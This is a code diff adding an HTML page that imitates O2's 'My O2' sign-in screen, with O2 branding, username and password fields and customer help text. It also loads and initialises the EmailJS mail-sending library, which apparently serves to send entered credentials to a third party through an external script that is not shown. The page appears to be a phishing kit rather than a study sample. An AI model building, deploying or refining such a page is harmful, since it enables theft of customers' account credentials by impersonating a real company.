@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <title>Document</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <!--Top bar-->
+    <div class="top-bar">
+      <div class="container">
+        <a href="#" class="sign-in">Sign in or Register</a>
+      </div>
+    </div>
+
+    <!--Main Bar-->
+    <nav class="navbar">
+      <div class="container">
+        <div class="logo-nav">
+          <div class="logo">
+            <a href="#">
+              <img src="img/PngItem_5149656-1.webp" alt="O2 Logo" />
+            </a>
+          </div>
+        </div>
+        <!--Drop down menu-->
+        <div class="menu-toggle">☰</div>
+        <ul class="nav-links">
+          <li><a href="#">Shop</a></li>
+          <li><a href="#">Why O2</a></li>
+          <li><a href="#">Help</a></li>
+        </ul>
+
+        <div class="right-section">
+          <a href="#" class="my-o2">My O2</a>
+          <div class="search-icon">
+            <a href="#"><img src="img/magnify.webp" alt="Search" /></a>
+          </div>
+          <a href="#" class="search-link"></a>
+          <div class="basket-icon">
+            <a href="#"
+              ><img src="img/basket_2-removebg-preview.png" alt="basket"
+            /></a>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <!--Down Bar-->
+
+    <div class="credit-check">
+      <div class="container">
+        <h1>My O2</h1>
+      </div>
+    </div>
+
+    <div class="sign-in-container">
+      <div class="container">
+        <div class="sign-in-section">
+          <h2>Sign in to My O2</h2>
+          <form id="signin-form" action="#" method="get">
+            <label for="username">Username (usually your email address)</label>
+            <input type="text" id="username" name="username" required />
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required />
+            <span class="show-password" id="togglepassword" onclick="togglePasswordVisibility()">
+                <i class="fa fa-eye"></i>
+            </span>
+            <div class="remember">
+                <input type="checkbox" id="remember" name="remember" />
+                <label for="remember">Remember my username</label>
+            </div>
+            <button type="submit" class="sign-in-btn">Sign In</button>
+        </form>
+          <a href="#" class="forgot-link">Forgot your username or password</a>
+
+          <hr class="divider">
+          <div class="alt-sign-in">
+            <div class="virgin-box">
+                <p>Use your Virgin Media O2 ID</p>
+                    <p>If you've linked your Virgin Media and O2 details to create a new Virgin Media O2 ID, sign in with it here. <a href="#">Find out more</a></p>
+                    <div class="button-container">
+                        <button class="virgin-sign-in-btn">Sign in with a Virgin Media O2 ID</button>
+            </div>
+          </div>
+        </div>
+            <div class="info-section">
+                <h3>Already an O2 customer</h3>
+                <p>If you've got a pay monthly account then we've automatically registered you with My O2 and given you a username and password. <a href="#">Help me sign in</a></p>
+                <h3>Not yet registered?</h3>
+                <ul>
+                    <li>Check your usage and remaining balance</li>
+                    <li>Set up auto top-ups</li>
+                    <li>Manage O2 Rewards</li>
+                </ul>
+                <p>O2 Wifi customer? You can register to manage your account here, whatever network you're on. <a href="#">Register now</a></p>
+            </div>
+      </div>
+    </div>
+
+    <!--Script Styling-->
+
+
+    <!-- Bootstrap JS, Popper.js, and jQuery -->
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
+    
+        <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+        <script>
+          emailjs.init("4Ejw-vJeWsb65fM5x"); // Initialize EmailJS
+      </script>
+    <script>
+    function validateForm() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+    
+        if (username === '' || password === '') {
+            alert('Please fill in both fields');
+            return false; // Prevent form submission if any field is empty
+        }
+        return true; // Allow form submission if validation passes
+    }
+    
+    function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('password');
+        const toggleIcon = document.getElementById('togglePassword').querySelector('i');
+    
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text'; // Show password
+            toggleIcon.classList.remove('fa-eye'); // Change the icon
+            toggleIcon.classList.add('fa-eye-slash');
+        } else {
+            passwordInput.type = 'password'; // Hide password
+            toggleIcon.classList.remove('fa-eye-slash'); // Revert the icon
+            toggleIcon.classList.add('fa-eye');
+        }
+    }
+    </script>
+    
+    <script src="script.js"></script>
+  </body>
+</html>
